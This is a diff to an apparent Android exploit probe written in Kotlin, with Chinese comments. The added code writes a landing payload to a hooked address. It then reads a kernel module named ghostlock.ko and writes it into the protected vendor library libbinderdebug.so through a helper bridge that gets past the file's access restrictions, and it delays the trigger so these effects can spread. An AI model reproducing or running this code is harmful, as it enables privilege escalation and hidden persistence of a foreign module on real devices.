@@ -769,8 +769,39 @@ object TypedBackendProbe {
             hook.initializeAccessAndRemember(hookParams, saInit(patcher.nextSequence()))
             val hookWrote = hook.writeHook(16L, saInit())  /* 这套原语的单位是 16 字节（8 会被 BadWidth 拒 —— 2026-10-15 真机证据） */
             step("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+            /* 载荷本体：钩子跳到 payload_file=0xfe628 时那里必须是我们的字节（此前只写了站点 ✗）。 */
+            runCatching {
+                val payload = hook.image(Assembled43284.ROLE_IMAGE_LANDING_PAYLOAD)
+                step("typed: hook payload bytes=" + (payload?.size ?: -1))
+                if (payload != null && payload.isNotEmpty()) {
+                    val payloadWrote = hook.writeImage(payload, 0xFE628L, 16L, saInit(hook.nextSequence()))
+                    step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+                }
+            }.onFailure { problem ->
+                step("typed: hook payload refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            }
             /* Trigger → Wait（退役链顺序：Hook 已成立 ⇒ 现在触发）。marker 用夹具的真实路径。 */
-            val triggerCode = hook.trigger(hookParams.accessTriggerDelayMs)
+            /* ② 模块写进 vendor 载体：载体对本进程 EACCES ⇒ 读与写都经 patch#1 写下的 helper（桥）。 */
+            runCatching {
+                val moduleBytes = java.io.File("/data/local/tmp/ghostlock.ko").readBytes()
+                step("typed: module bytes=" + moduleBytes.size)
+                val carrierPath = "/vendor/lib64/libbinderdebug.so"
+                val module = Assembled43284(Native43284.create()) { saInit() }
+                module.openTargetStepwise(carrierPath)
+                module.reuseSocketFrom(stepwise)
+                module.buildSurface()
+                module.buildLanding()
+                module.buildAccess()
+                val moduleParams = Assembled43284.fullAccessParams(carrierPath)
+                val moduleInit = module.initializeAccessAndRemember(moduleParams, saInit(patcher.nextSequence()))
+                step("typed: module init=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
+                val moduleWrote = module.writeImage(moduleBytes, 0L, 16L, saInit(module.nextSequence()))
+                step("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
+            }.onFailure { problem ->
+                step("typed: module refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            }
+            /* 非 0 延迟：触发要等 helper/hook 的效应铺开（设计里的 accessTriggerDelayMs 目前是 0）。 */
+            val triggerCode = hook.trigger(if (hookParams.accessTriggerDelayMs > 0L) hookParams.accessTriggerDelayMs else 2000L)
             step("typed: hook trigger code=" + triggerCode + " delayMs=" + hookParams.accessTriggerDelayMs + " refusal=" + hook.lastRefusal)
             val terminal = hook.waitTerminal(
                 budgetMs = 15000L,
